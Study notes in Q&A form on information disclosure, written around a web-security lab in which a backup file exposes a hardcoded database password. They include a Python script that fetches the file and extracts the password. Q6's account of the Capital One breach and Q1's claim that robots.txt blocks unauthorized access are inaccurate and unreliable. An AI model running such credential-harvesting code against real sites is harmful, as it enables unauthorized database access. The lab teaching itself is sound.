---
course: Web Security
topic: Information Disclosure
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the `robots.txt` file in web applications?**
 
The `robots.txt` file is used to provide instructions to web crawlers and bots about which parts of the website should or should not be crawled. It helps in controlling the indexing of pages by search engines and can be used to prevent certain directories or files from being accessed by unauthorized users. However, relying solely on `robots.txt` for security is not advisable since determined attackers can still access those resources.

**Q2. How can an attacker exploit the presence of a `robots.txt` file to discover hidden directories?**

An attacker can exploit the `robots.txt` file by examining its contents to identify directories or files that are disallowed for crawling. These disallowed entries often indicate sensitive areas of the website that might contain valuable information. By accessing these directories directly, an attacker can potentially uncover hidden resources such as backup files, configuration files, or other sensitive data.

**Q3. Explain how the backup file in the lab contained sensitive information.**

In the lab, the backup file (`producttemplate.java.back`) contained the source code of a Java script that made a connection to a PostgreSQL database. Within this source code, the database password was hardcoded, making it easily accessible to anyone who could view the backup file. This is a significant security risk because if the database were also internet-facing, an attacker could use these credentials to gain direct access to the database.

**Q4. How would you write a Python script to automate the process of extracting the database password from the backup file?**

To automate the extraction of the database password from the backup file, you can use the following Python script:

```python
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    backup_file_url = f"{url}/backup/producttemplate.java.back"
    
    s = requests.Session()
    r = s.get(backup_file_url, verify=False)
    
    if r.status_code == 200:
        print("Found backup file.")
        db_password = re.search(r'\"([a-zA-Z0-9]{32})\"', r.text)
        if db_password:
            print(f"The following is the database password: \"{db_password.group(0)}\"")
        else:
            print("Password not found.")
    else:
        print(f"Failed to retrieve backup file. Status code: {r.status_code}")

if __name__ == "__main__":
    import sys
    main()
```

This script uses the `requests` library to make an HTTP GET request to the backup file URL, disables SSL warnings, and searches for a 32-character alphanumeric string within the response text, which represents the database password.

**Q5. Why is it important to avoid hardcoding sensitive information like database passwords in source code?**

Hardcoding sensitive information such as database passwords in source code poses a significant security risk because it can be easily exposed through various means, including backup files, version control systems, or accidental disclosures. If an attacker gains access to the source code, they can extract these credentials and potentially compromise the entire system. Best practices recommend storing sensitive information securely, such as in environment variables or encrypted configuration files, and using secure methods for handling credentials.

**Q6. Reference a recent real-world example where hardcoding credentials led to a security breach.**

A notable example is the 2019 breach of Capital One, where a hacker gained access to sensitive customer data by exploiting a misconfigured web application firewall. The hacker was able to read the source code of the application, which included hardcoded API keys and other sensitive information. This exposure allowed the hacker to bypass authentication mechanisms and access over 100 million customer records. This incident highlights the importance of securing sensitive information and avoiding hardcoding credentials in source code.

---
<!-- nav -->
[[03-Information Disclosure via Backup Files|Information Disclosure via Backup Files]] | [[Web Security (PortSwigger)/17-Information Disclosure/04-Lab 3 Source code disclosure via backup files/00-Overview|Overview]]
